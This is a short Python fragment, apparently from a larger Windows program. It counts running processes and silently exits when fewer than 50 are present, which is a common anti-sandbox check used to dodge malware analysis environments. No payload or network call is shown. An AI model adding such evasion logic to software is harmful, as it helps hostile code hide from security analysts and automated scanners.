import ctypes
import psutil # type: ignore

from main import error_handler

async def check_process_count(self) -> None:
    try:
        if len(psutil.pids()) < 50:
            ctypes.windll.kernel32.ExitProcess(0)
    except Exception as e:
        error_handler(f"process count error - {str(e)}")
